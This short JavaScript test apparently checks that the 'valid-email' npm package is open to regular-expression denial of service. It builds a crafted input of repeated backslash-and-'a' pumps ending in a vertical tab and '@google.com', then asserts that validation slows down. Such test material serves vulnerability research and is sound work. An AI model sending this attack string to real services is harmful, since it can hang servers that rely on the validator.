const { expectRedos } = require("../utils");

test("ReDos in valid-email", () => {
  const validate = require("valid-email");
  const pump = "\\\\a\\\\\\a";
  expectRedos({
    run: (input) => {
      validate(input);
    },
    build: (n) => {
      let attackString = "";
      for (let i = 0; i < n; i++) {
        attackString += pump;
      }
      attackString += "\x0B";
      return `${attackString}@google.com`;
    },
    n: 9,
  });
});
